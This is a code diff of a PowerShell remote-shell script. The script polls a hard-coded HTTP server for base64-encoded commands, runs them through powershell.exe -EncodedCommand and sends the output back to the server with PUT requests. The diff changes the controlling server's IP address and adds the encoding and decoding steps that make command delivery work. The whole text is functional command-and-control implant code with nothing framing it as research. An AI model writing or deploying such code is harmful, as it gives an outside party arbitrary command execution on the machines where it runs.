@@ -28,8 +28,9 @@ If you want to debug the script the verbose option will output a lot of info dur
 #     [Parameter(Mandatory = $true)]    [string]    [ValidateNotNullOrEmpty()]  [Alias('s')]  $server,
 #     [Parameter(Mandatory = $false)]    [int]       [ValidateNotNullOrEmpty()]  [Alias('p')]  $port = 80
 # )
+
 $port = 80
-$server = "100.26.159.22"
+$server = "100.26.120.221"
 $SEND_PATH = "cmd"
 $RECV_PATH = "output"
 $PROTOCOL = "http"
@@ -43,7 +44,9 @@ $WAIT_MS = 500
 
 function Get-Command {
     $command = Invoke-RestMethod -Method "GET" $send_url | Out-String
-    return $command
+    # $command = Invoke-RestMethod -Method "GET" $send_url 
+    # $command = [system.Text.Encoding]::UTF8.GetString((Invoke-RestMethod -Method "GET" $send_url).RawContentStream.ToArray())
+    return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($command))
 }
 
 function Invoke-Cmd([string] $command) {
@@ -54,15 +57,15 @@ function Invoke-Cmd([string] $command) {
     $response = ""
     if ($command) {
         Write-Verbose "Recieved command: $command"
-
         try {
             # Encode the command as base64 and send to powershell
             # This seems to solve some issues around formatting and escaping
-
-            # $commandbytes = [System.Text.Encoding]::Unicode.GetBytes($command)
-            # $base64command = [System.Convert]::ToBase64String($commandbytes)
-            # $response = &powershell.exe -EncodedCommand "$base64command" 2>&1 | Out-String
-            $response = &powershell.exe $command
+            
+            $commandbytes = [System.Text.Encoding]::Unicode.GetBytes($command)#[System.Text.Encoding]::UTF8.GetBytes($command)
+            
+            $base64command = [System.Convert]::ToBase64String($commandbytes)
+            $response = &powershell.exe -EncodedCommand "$base64command" 2>&1 | Out-String
+            # $response = &powershell.exe [System.Text.Encoding]::Unicode.($command)
         }
         catch {
             Write-Output "error"
@@ -73,9 +76,9 @@ function Invoke-Cmd([string] $command) {
     return $response
 }
 
-function Send-Response([string] $response) {
+function Send-Response($response) {
     if ($response) {
-        Invoke-RestMethod -Method "PUT" -Body $response $recv_url
+        Invoke-RestMethod -Method "PUT" -Body ([System.Text.Encoding]::UTF8.GetBytes($response)) $recv_url
     }
     else {
         Invoke-RestMethod -Method "PUT" -Body "no output" $recv_url
@@ -91,7 +94,7 @@ while ($connected) {
     $command = Get-Command
     
     # Look for the end command which stops the shell remotely
-    if ($command.Length -gt 2) {
+    if ($command.Length -gt 0) {
         # Write-Output "co$command, L " $command.Length
         if ($command -like "*$END_CMD*") {
             Write-Verbose "Shutting down"
@@ -99,7 +102,7 @@ while ($connected) {
         }
         elseif ($command.IndexOf("000") -eq 0) {
        
-            $t = $command.Substring(3, $command.Length - 5)
+            $t = $command.Substring(3, $command.Length - 3)
             Set-Location -Path $t
             $path = Get-Location | Out-String
             Send-Response $path
@@ -108,7 +111,7 @@ while ($connected) {
             # Else execute the command and send the response
             $response = Invoke-Cmd $command
             # Write-Output $response.Length
-            
+            # Write-Output "Recieved command: $command"
             Send-Response $response
             # Write-Output "hi" $response.Length
         }
